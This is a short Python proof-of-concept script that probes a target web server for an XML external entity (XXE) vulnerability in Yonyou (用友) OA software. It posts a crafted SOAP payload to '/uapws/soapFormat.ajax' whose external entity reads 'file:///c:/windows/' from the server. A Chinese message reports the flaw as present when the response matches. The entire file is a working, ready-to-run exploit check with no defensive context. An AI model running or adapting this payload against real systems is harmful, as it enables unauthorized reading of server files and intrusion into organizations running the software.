import requests
from lib.get_normal_url import get_standard_url
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

def poc(target):
    try:
        target = get_standard_url(target)
        url = target + '/uapws/soapFormat.ajax'
        data = 'msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///c:/windows/"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a'
        req = requests.post(url,headers=headers,data=data)
        if req.status_code == 200 and 'soap:Envelope' in req.text:
            print("\033[0;31m 存在用友oa xxe漏洞："+ url )
    except:
        pass


